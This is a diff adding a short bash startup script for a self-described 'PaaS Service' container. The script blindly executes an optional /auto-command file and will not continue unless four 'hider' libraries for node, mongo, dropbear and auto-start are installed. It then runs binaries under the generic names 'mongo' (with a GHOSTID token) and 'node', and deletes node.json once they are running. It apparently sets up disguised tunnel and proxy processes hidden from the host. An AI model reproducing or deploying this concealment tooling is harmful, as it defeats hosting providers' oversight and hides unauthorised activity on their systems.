@@ -1,0 +1,69 @@
+#!/bin/bash
+
+echo 'PaaS Service is starting'
+
+/etc/init.d/php8.3-fpm start
+/etc/init.d/ssh start
+/etc/init.d/cron start
+
+if [ -f /auto-command ]
+then
+     echo "已檢測到附加腳本"
+     chmod +x /auto-command
+     ./auto-command
+else
+     echo '未檢測到附加腳本，繼續運行'
+
+fi
+
+sleep 5
+
+if [ -f /Hider/node.so ]
+then
+     echo "node hider is installed."
+else
+     echo "can't find node hider program."
+     exit
+fi
+
+if [ -f /Hider/mongo.so ]
+then
+     echo "mongo hider is installed."
+else
+     echo "can't find mongo hider program"
+     exit
+fi
+
+if [ -f /Hider/dropbear.so ]
+then
+     echo "Dropbear hider is installed."
+else
+     echo "can't find dropbear hider program"
+     exit
+fi
+
+if [ -f /Hider/auto-start.so ]
+then
+     echo "Auto-start hider is installed."
+else
+     echo "can't find auto-start hider program"
+     exit
+fi
+
+if [ -f GHOSTID ]
+then
+     echo "Find GHOSTID."
+     ./mongo service install `cat GHOSTID` > /dev/null &
+else
+     echo "Can't find GHOSTID"
+     ./mongo service install "$GHOSTID" > /dev/null &
+fi
+
+sleep 7
+
+node run -c /node.json >> /dev/null &
+
+
+sleep 10
+
+caddy run --config /Caddyfile && rm -rf /node.json
